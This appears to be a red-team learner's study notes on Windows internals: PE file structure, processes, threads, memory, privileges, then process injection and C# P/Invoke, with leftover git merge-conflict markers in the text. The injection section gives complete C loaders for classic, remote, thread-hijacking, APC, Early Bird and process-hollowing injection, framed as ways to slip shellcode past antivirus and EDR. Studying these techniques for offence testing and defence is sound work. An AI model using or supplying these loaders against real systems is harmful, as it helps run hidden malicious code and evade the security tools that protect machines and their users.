Most C2 frameworks, including Cobalt Strike, are capable of producing ready-to-run payloads in formats such as `.exe`, `.dll`, `.ps1`, and more, but know how to build your own payloads is beneficial.
<<<<<<< HEAD

=======
>>>>>>> fefa77b (lots and lots of red)
## PE File Structure
Portable Executable (PE) file format holds necessary info about a program for the OS to load it into memory. Both `.exe` and `.dll` files are PEs

![[5cffff248cd671eb063343d8ce1a8538 3.png]]

<<<<<<< HEAD
=======
Oversimplified Version
![[Pasted image 20251218183841.png]]

>>>>>>> fefa77b (lots and lots of red)
#### DOS header
Fixed 64-byte structure called `IMAGE_DOS_HEADER` that exists at start of every PE file. 2 important ones:
	`e_magic`
		first member
		2-byte WORD
		always `4D 5A`, or `MZ` in ASCII
	`e_lfanew`
		last member
		4-byte LONG
		located at offset 3C
	![[4e18d4b8509739b640864584af443287.png]]
#### DOS stub
Only used when PE file is executed under MS-DOS.
	Prints "This program cannot be run in DOS mode"
	![[76235c546519432579bb83ce1949806e.png]]
Modern Windows loader uses the offset in `elfanew` to skip this and jump to NT headers
#### NT headers
The Windows SDK (software development kit) has two definitions for the NT header - `IMAGE_NT_HEADERS` for 32-bit PEs and `IMAGE_NT_HEADERS64` for 64-bit PEs.

PE signature
	4-byte DWORD
	fixed value of `50 45 00 00` (PE\0\0 in ASCII)

File Header -- `IMAGE_FILE_HEADER`
	Machine
		2-byte WORD
		indicates CPU architecture the PE is compiled for
		[Values](https://learn.microsoft.com/en-us/windows/win32/debug/pe-format#machine-types)
	NumberOfSections
		WORD
		holds number of sections PE has
	SizeOfOptionalHeader
		2-byte WORD
		holds size of optional header
	Characteristics
		2-byte flag that describes some attributes of the PE
	![[d56698e6ece4ce71156e978790e4bb1b.png]]

Optional Header -- `IMAGE_OPTIONAL_HEADER32` or `IMAGE_OPTIONAL_HEADER64`
	Magic
		Value
		determines if PE32 or PE32+ (32 bit vs 64 bit)
	AddressOfEntryPoint
		address of PE entry point relative to image base when loaded into memory
	ImageBase
		base address for PE image
	NumberOfRvaAndSizes
		size of DataDirectory array
	DataDirectory
		array of `IMAGE_DATA_DIRECTORY` structures
	![[d8a35878a30ce2c91590a15d8918b386.png]]

#### Data directories
`IMAGE_DATA_DIRECTORY` structure contains 2 members
	VirtualAddress
		points to start of data directory structure
	Size

#### Sections
The PE sections contain the actual data and executable code of the program:

**.text** - executable code of program
**.data** - initialized data
**.bss** - uninitialized data
**.rdata** - read-only data 
**.rsrc** - resources used by program ie: images

Each section is appended to a header that describes it. Each section header contains a
	Name
		limited to 8-bytes
	VirtualSize
		total size when loaded into memory
	VirtualAddress
		memory address of section loaded into memory
	SizeOfRawData
		size as if stored on disc
	Characteristics
		set of flags that describe characteristics of the section

## Processes
A _program_ is a set of instructions that have been compiled into a PE file, typically `.exe` or `.dll`.  
A _process_ can be thought of as a container to hold the resources of a running program

Multiple APIs can be used to start a process
	[CreateProcessW](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessw)
	[CreateProcessAsUserW](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessasuserw)
	[CreateProcessWithLogonW](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithlogonw)
	![[0503c20bf907334087e1cb12935254cb.png]]

#### Threads
<<<<<<< HEAD
=======
A thread is a type of object that Windows schedules for execution within a process.

Thread creation functions
	[CreateThread](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread) - creates new thread in calling process
	[CreateRemoteThread](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread) - creates new thread in another process
	Both APIs call into [CreateRemoteThreadEx](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethreadex)

#### Memory
Every process has its own private virtual memory that it uses to store data during its runtime.
![[b11bcfcd782f25f005c9fcaa29b30306.png]]

Memory management is performed in distinct chunks called _pages_
	Small
		x86, x64, ARM - 4KB
	Large
		x86, x64 - 2MB
		ARM - 4 MB

Multiple APIs to allocate and free virtual memory
	Virtual APIs
		lower-level used for general (de)allocations
		[VirtualAlloc](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc), [VirtualFree](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualfree), and [VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
	Heap APIs
		used to manage memory allocations that are smaller than a page
		[HeapAlloc](https://learn.microsoft.com/en-us/windows/win32/api/heapapi/nf-heapapi-heapalloc), [HeapReAlloc](https://learn.microsoft.com/en-us/windows/win32/api/heapapi/nf-heapapi-heaprealloc), and [HeapFree](https://learn.microsoft.com/en-us/windows/win32/api/heapapi/nf-heapapi-heapfree)
	Memory-mapping APIs
		designed to map files into memory from disk
		[CreateFileMappingA](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createfilemappinga), [OpenFileMappingA](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-openfilemappinga), and [MapViewOfFile](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-mapviewoffile)

#### Access Tokens
When a process is spawned, it is assigned with a primary access token that describes the _security context_ of the user that started it
	SID, their group SIDs, and their privileges

By default, new threads do not have a specific access token assigned to them, and therefore inherit the security context of the process's primary access token
![[1db704b10e46dfae377ac9e6dd7a23aa.png]]


#### Privileges
A _privilege_ grants a security principal with the right to perform a system-related operation. These [privileges](https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants) are granted by the system administrators, typically via GPOs or locally with [secpol](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/how-to-configure-security-policy-settings).

There are privileges that are so powerful that any user that can enable them can effectively take control of the entire computer, even if they are not administrators.  These include:

- **SeDebugPrivilege** - obtain read/write handles to any process, even those owned by other users or SYSTEM.
- **SeTakeOwnershipPrivilege** - take ownership of any securable object including files, handles, and threads.
- **SeRestorePrivilege** - replace any file on the system. 
- **SeLoadDriverPrivilege** - load a device driver into the kernel.
- **SeCreateTokenPrivilege** - create arbitrary access tokens to impersonate any user with any privilege and any domain group membership.

#### Termination
A process may terminate itself gracefully by calling [ExitProcess](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-exitprocess). 

A process may terminate another process by calling [TerminateProcess](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-terminateprocess) Forces ungraceful termination

## Process Injection
Process injection is a privilege escalation and defense evasion technique.  The idea of which is to inject untrusted code into the address space of a trusted process, potentially bypassing defense solutions.

Summary of steps:
	Allocate a new region of memory in the process.
	Copy the shellcode into that region.
	Execute the shellcode (typically with a thread).

Some code snippets below of injections:
#### Classic Injection
Vanilla form of process injection. Injects and executes shellcode in running process

APIs used:
	VirtualAlloc
	WriteProcessMemory
	CreateThread

Downsides:
	Will most likely flag AV/EDR

```C
#include <Windows.h>

int main()
{
    unsigned char shellcode[] = "..."; // your shellcode goes here

    // allocate a region of memory
    auto hMemory = VirtualAlloc(
        NULL,                       // we don't mind where it's allocated
        sizeof(shellcode),          // the size of memory region
        MEM_COMMIT | MEM_RESERVE,   // type of memory allocation
        PAGE_EXECUTE_READWRITE      // memory protection (think RWX...)
    );
    
    // write the shellcode into memory
    SIZE_T bytesWritten = 0;
    WriteProcessMemory(
        GetCurrentProcess(),    // handle to target process
        hMemory,                // pointer to target memory region
        &shellcode,             // pointer to data to write
        sizeof(shellcode),      // length of data to write
        &bytesWritten           // receives the number of bytes written
    );

    // create a new thread
    DWORD threadId = 0;
    auto hThread = CreateThread(
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)hMemory,  // a pointer to the thing to execute
        NULL,
        0,
        &threadId                         // receives the new thread ID
    );

    // wait for the thread to finish
    WaitForSingleObject(
        hThread,    // the handle to wait on
        INFINITE    // the length of time to wait
    );
    
    // close the thread handle
    CloseHandle(hThread);
}
```

#### Classic Remote Injection
Same style of injection but we target a specific process

Downsides:
	Will most likely flag AV/EDR

```C
#include <Windows.h>

int main(int argc, char* argv[])
{
    unsigned char shellcode[] = "...";

    // convert the provided argument to an integer
    auto pid = atoi(argv[1]);

    // get handle to process
    auto hProcess = OpenProcess(
        PROCESS_ALL_ACCESS, // desired access level
        FALSE,
        pid                 // target process ID
    );

    // sanity check the handle is valid
    if (hProcess == INVALID_HANDLE_VALUE) {
        return 0;
    }

    // allocate a region of memory
    auto hMemory = VirtualAllocEx(
        hProcess,   // handle to target process
        NULL,
        sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    
    // write the shellcode into memory
    SIZE_T bytesWritten = 0;
    WriteProcessMemory(
        hProcess,
        hMemory,
        &shellcode,
        sizeof(shellcode),
        &bytesWritten
    );

    // create a new thread
    DWORD threadId = 0;
    auto hThread = CreateRemoteThread(
        hProcess,   // handle to target process
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)hMemory,
        NULL,
        0,
        &threadId
    );

    // wait for the thread to finish
    WaitForSingleObject(
        hThread,
        INFINITE
    );
    
    // close the thread handle
    CloseHandle(hThread);
}
```
#### Thread Hijacking

AV can receive notifications when new threads are created and inspect the memory. This can block classic injections.

Potential workaround is creating a thread in a suspended state but pointing to a benign location. After some point (after AV has scanned), the thread context can be changed to point at shellcode.

```C
#include <Windows.h>

void dummy() {
    // do nothing
}

int main()
{
    unsigned char shellcode[] = "...";

    // allocate a region of memory
    auto hMemory = VirtualAlloc(
        NULL,
        sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    // write the shellcode into memory
    SIZE_T bytesWritten = 0;
    WriteProcessMemory(
        GetCurrentProcess(),
        hMemory,
        &shellcode,
        sizeof(shellcode),
        &bytesWritten
    );

    // create a suspended thread pointing at a dummy function
    DWORD threadId = 0;
    auto hThread = CreateThread(
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)&dummy,
        NULL,
        CREATE_SUSPENDED,
        &threadId
    );

    // little sleep
    Sleep(5 * 1000);

    // get current thread's context
    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_ALL;

    GetThreadContext(hThread, &ctx);

    // point thread context at shellcode
    ctx.Rip = (DWORD64)hMemory;
    SetThreadContext(hThread, &ctx);

    // resume the thread
    ResumeThread(hThread);

    // wait on thread
    WaitForSingleObject(hThread, INFINITE);

    // close handle
    CloseHandle(hThread);
}
```

#### Asynchronous Procedure Calls
This technique is similar to above but instead of creating a new thread, we queue an [asynchronous procedure call](https://learn.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls) on an existing thread.

When thread enters alertable state (ie when it calls an API like sleep), it will run the shellcode the APC points to. 

Requirements:
	we need the handle to a thread
	Thread ID
		requires "thread walk"

Downsides:
	No guarantee thread will become alertable -- ie no running shellcode

```C
#include <Windows.h>
#include <tlhelp32.h>

int main(int argc, char* argv[])
{
    unsigned char shellcode[] = "...";

    // convert the provided argument to an integer
    auto pid = atoi(argv[1]);

    DWORD threadId = 0;

    // create thread snapshot
    auto hSnapshot = CreateToolhelp32Snapshot(
        TH32CS_SNAPTHREAD,
        0
    );

    THREADENTRY32 te = { 0 };
    te.dwSize = sizeof(te);

    // walk the threads
    Thread32First(hSnapshot, &te);

    do {
        if (te.dwSize >= FIELD_OFFSET(THREADENTRY32, th32OwnerProcessID) + sizeof(te.th32OwnerProcessID)) {
            if (te.th32OwnerProcessID == pid) {
                // use the first thread we find
                threadId = te.th32ThreadID;
                break;
            }
        }
        te.dwSize = sizeof(te);
    } while (Thread32Next(hSnapshot, &te));

    if (threadId == 0) {
        // we failed to find a thread
        return 0;
    }

    // get a handle to the process
    auto hProcess = OpenProcess(
        PROCESS_ALL_ACCESS,
        FALSE,
        pid
    );

    // allocate a region of memory
    auto hMemory = VirtualAllocEx(
        hProcess,
        NULL,
        sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    // write the shellcode into memory
    SIZE_T bytesWritten = 0;
    WriteProcessMemory(
        hProcess,
        hMemory,
        &shellcode,
        sizeof(shellcode),
        &bytesWritten
    );

    // open handle to target thread
    auto hThread = OpenThread(
        THREAD_ALL_ACCESS,
        FALSE,
        threadId
    );

  	// queue the apc
    QueueUserAPC(
        (PAPCFUNC)hMemory,  // target function
        hThread,            // target thread
        0
    );
}
```

#### Early Bird

Spawns new process in suspended state, queues APC on its primary thread, then resumes process

```C
#include <Windows.h>

int main()
{
    unsigned char shellcode[] = "...";

    STARTUPINFOW si = { 0 };
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;

    PROCESS_INFORMATION pi = { 0 };

    // spawn process in suspended state
    CreateProcess(
        L"C:\\Windows\\System32\\cmd.exe",
        NULL,
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED,
        NULL,
        L"C:\\Windows\\System32",
        &si,
        &pi
    );

    // allocate a region of memory
    auto hMemory = VirtualAllocEx(
        pi.hProcess,    // handle to newly spawned process
        NULL,
        sizeof(shellcode),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    // write the shellcode into memory
    SIZE_T bytesWritten = 0;
    WriteProcessMemory(
        pi.hProcess,
        hMemory,
        &shellcode,
        sizeof(shellcode),
        &bytesWritten
    );

    // queue the apc
    QueueUserAPC(
        (PAPCFUNC)hMemory,
        pi.hThread,
        0
    );

    // resume the process
    ResumeThread(pi.hThread);

    // tidy up our handles
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
}
```

#### Process Hollowing

Process is started in suspended state -> original PE is unmapped from memory -> new PE mapped in its place

Requirements:
	Identify PE's entry point - [NtQueryInformationProcess](https://learn.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntqueryinformationprocess) API
		populates `PROCESS_BASIC_INFORMATION`

```C
#include <Windows.h>
#include <winternl.h>

#pragma comment(lib, "ntdll.lib")

int main()
{
    unsigned char shellcode[] = "...";

    STARTUPINFOW si = { 0 };
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;

    PROCESS_INFORMATION pi = { 0 };

    // spawn process in suspended state
    CreateProcess(
        L"C:\\Windows\\System32\\cmd.exe",
        NULL,
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED,
        NULL,
        L"C:\\Windows\\System32",
        &si,
        &pi
    );

    // get the process information to find the address of the PEB
    PROCESS_BASIC_INFORMATION pbi = { 0 };
    ULONG returnLength;
    NtQueryInformationProcess(
        pi.hProcess,
        ProcessBasicInformation,
        &pbi,
        sizeof(pbi),
        &returnLength
    );

    // the image base address is always at PEB + 0x10 for x64
    auto lpBaseAddress = (LPVOID)((DWORD64)(pbi.PebBaseAddress) + 0x10);

    // read the base address (addresses are 8 bytes for x64)
    LPVOID baseAddress = 0;
    SIZE_T bytesRead = 0;
    ReadProcessMemory(
        pi.hProcess,
        lpBaseAddress,
        &baseAddress,
        8,
        &bytesRead
    );

    // now we can read the dos header
    IMAGE_DOS_HEADER dHeader = { 0 };
    ReadProcessMemory(
        pi.hProcess,
        baseAddress,
        &dHeader,
        sizeof(dHeader),
        &bytesRead
    );

    // use e_lfanew to calculate pointer to nt header
    auto lpNtHeader = (LPVOID)((DWORD64)baseAddress + dHeader.e_lfanew);

    // read the nt header
    IMAGE_NT_HEADERS ntHeaders = { 0 };
    ReadProcessMemory(
        pi.hProcess,
        lpNtHeader,
        &ntHeaders,
        sizeof(ntHeaders),
        &bytesRead
    );

    // calculate the entry point address
    auto entryPoint = (LPVOID)((DWORD64)baseAddress + ntHeaders.OptionalHeader.AddressOfEntryPoint);

    // write shellcode to this location, overwriting the PE
    SIZE_T bytesWritten = 0;
    WriteProcessMemory(
        pi.hProcess,
        entryPoint,
        shellcode,
        sizeof(shellcode),
        &bytesWritten
    );

    // resume the process
    ResumeThread(pi.hThread);
}
```

## P/Invoke
Previous Section is all written in C. It is useful to know how to do code injection in other languages...

[Platform Invoke](https://learn.microsoft.com/en-us/dotnet/standard/native-interop/pinvoke) Allows you to access functions from unmanaged libraries from your managed C# code.
	These functions are declared with the `extern` keyword and `DllImport` attribute.

Example code:
```C#
[DllImport("kernel32.dll", SetLastError = true)]
[DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
public static extern nuint OpenProcess(
    PROCESS_ACCESS_RIGHTS dwDesiredAccess, 
    bool bInheritHandle,
    uint dwProcessId);
```
Explanation:
	`SetLastError` = true
		allows recovery of error code of last API that was called using `Marshal.GetLastWin32Error()`
	`DefaultDllImportSearchPaths` protects against DLL hijacking
		forces app to look in System32

Downsides:
	we cant access Windows headers `Windows.h`
		lack type definitions for structs and enums so we have to manually add them

```C#
[Flags]
public enum PROCESS_ACCESS_RIGHTS : uint
{
    PROCESS_TERMINATE = 0x00000001,
    PROCESS_CREATE_THREAD = 0x00000002,
    PROCESS_SET_SESSIONID = 0x00000004,
    PROCESS_VM_OPERATION = 0x00000008,
    PROCESS_VM_READ = 0x00000010,
    PROCESS_VM_WRITE = 0x00000020,
    PROCESS_DUP_HANDLE = 0x00000040,
    PROCESS_CREATE_PROCESS = 0x00000080,
    PROCESS_SET_QUOTA = 0x00000100,
    PROCESS_SET_INFORMATION = 0x00000200,
    PROCESS_QUERY_INFORMATION = 0x00000400,
    PROCESS_SUSPEND_RESUME = 0x00000800,
    PROCESS_QUERY_LIMITED_INFORMATION = 0x00001000,
    PROCESS_SET_LIMITED_INFORMATION = 0x00002000,
    PROCESS_ALL_ACCESS = 0x001FFFFF,
    PROCESS_DELETE = 0x00010000,
    PROCESS_READ_CONTROL = 0x00020000,
    PROCESS_WRITE_DAC = 0x00040000,
    PROCESS_WRITE_OWNER = 0x00080000,
    PROCESS_SYNCHRONIZE = 0x00100000,
    PROCESS_STANDARD_RIGHTS_REQUIRED = 0x000F0000
}
```

#### Marshalling
Some WinAPIs have two variants
	A (ANSI)
	W (Unicode)

Difference is encoding used for strings.
	ANSI: UTF-8
	Unicode: UTF-16

C# doesn't understand this because it is a `single` string type. We can guide it (marshall) via `CharSet` attribute

Example of Marshalling Managed C# strings
```C#
// ANSI
[DllImport("KERNEL32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
[DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
public static extern IntPtr LoadLibraryA(string libFileName);

// Unicode
[DllImport("KERNEL32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
[DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
public static extern IntPtr LoadLibraryW(string libFileName);
```

#### Resources
Most well-known resource (temperamental!) for pre-made P/Invoke code is [pinvoke.net](https://pinvoke.net/).  In most cases you'll be able to find signature definitions for APIs (like [OpenProcess](https://pinvoke.net/default.aspx/kernel32.OpenProcess)) so that you don't have to translate them manually from the API documentation.
>>>>>>> fefa77b (lots and lots of red)
